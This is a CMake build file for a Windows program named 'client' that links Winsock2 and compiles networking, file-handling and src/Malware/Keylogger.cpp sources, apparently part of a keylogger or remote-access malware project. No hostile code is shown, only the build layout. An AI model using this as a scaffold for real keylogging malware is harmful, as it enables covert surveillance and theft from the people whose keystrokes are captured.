cmake_minimum_required(VERSION 3.16)
project(Client)

set(CMAKE_RUNTIME_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/bin)
# Add source files
add_executable(client 
src/main.cpp 
src/Networking/ClientNetwork.cpp
src/Malware/Keylogger.cpp
src/Utils/FileHandler.cpp
)

# Include header files
target_include_directories(client PRIVATE lib)

# Link against Winsock2 library (Windows)
target_link_libraries(client ws2_32)

#TODO update the cmake with the new folders 